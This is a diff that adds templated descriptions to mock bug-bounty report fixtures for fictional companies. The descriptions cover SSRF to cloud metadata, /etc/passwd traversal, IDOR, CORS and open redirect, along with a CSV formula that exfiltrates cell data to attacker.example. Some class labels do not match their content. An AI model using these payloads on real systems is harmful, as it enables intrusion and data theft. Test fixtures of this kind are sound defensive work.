+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.alpenquell-wasserwerke.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -10927,7 +11012,8 @@
           "offset": "1d 8h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.alpenquell-wasserwerke.foo/statements/`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11051,7 +11137,8 @@
           "offset": "4d 9h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.alpenquell-wasserwerke.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11203,7 +11290,8 @@
           "offset": "5d 9h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.alpenquell-wasserwerke.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11323,7 +11411,8 @@
           "offset": "20h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenquell-wasserwerke.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11457,7 +11546,8 @@
           "offset": "4d 4h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.alpenquell-wasserwerke.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11589,7 +11679,8 @@
           "offset": "3d",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.alpenquell-wasserwerke.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11708,7 +11799,8 @@
           "offset": "5d 21h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.alpenquell-wasserwerke.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11822,7 +11914,8 @@
           "offset": "13h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.alpenquell-wasserwerke.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11941,7 +12034,8 @@
           "offset": "5d 9h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.alpenquell-wasserwerke.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12069,7 +12163,8 @@
           "offset": "2d 2h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.alpenquell-wasserwerke.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12187,7 +12282,8 @@
           "offset": "2d 5h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.alpenquell-wasserwerke.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12302,7 +12398,8 @@
           "offset": "2d 9h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.alpenquell-wasserwerke.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -12414,7 +12511,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.alpenquell-wasserwerke.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12534,7 +12632,8 @@
           "offset": "5d 19h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.alpenquell-wasserwerke.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12682,7 +12781,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.alpenquell-wasserwerke.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12776,7 +12876,8 @@
           "offset": "2d 22h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.alpenquell-wasserwerke.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12943,7 +13044,8 @@
           "offset": "5d 17h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenquell-wasserwerke.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
diff --git a/fixtures/reports/auenrhein_logistics_ag_reports.json b/fixtures/reports/auenrhein_logistics_ag_reports.json
index 45c83a7..17726b1 100644
--- a/fixtures/reports/auenrhein_logistics_ag_reports.json
+++ b/fixtures/reports/auenrhein_logistics_ag_reports.json
@@ -69,7 +69,8 @@
           "offset": "5d 13h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.auenrhein-logistics.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -204,7 +205,8 @@
           "offset": "8d 11h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.auenrhein-logistics.foo/import`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -340,7 +342,8 @@
           "offset": "2d 15h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.auenrhein-logistics.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -500,7 +503,8 @@
           "offset": "4d 2h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.auenrhein-logistics.foo/export`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -599,7 +603,8 @@
           "offset": "1d 1h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.auenrhein-logistics.foo/export`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -760,7 +765,8 @@
           "offset": "5d 4h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.auenrhein-logistics.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -914,7 +920,8 @@
           "offset": "15h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.auenrhein-logistics.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -988,7 +995,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.auenrhein-logistics.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1120,7 +1128,8 @@
           "offset": "1d 13h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.auenrhein-logistics.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1268,7 +1277,8 @@
           "offset": "2d 12h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.auenrhein-logistics.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1424,7 +1434,8 @@
           "offset": "6d 23h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.auenrhein-logistics.foo/import`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1536,7 +1547,8 @@
           "offset": "2d 13h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.auenrhein-logistics.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1678,7 +1690,8 @@
           "offset": "2d 4h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
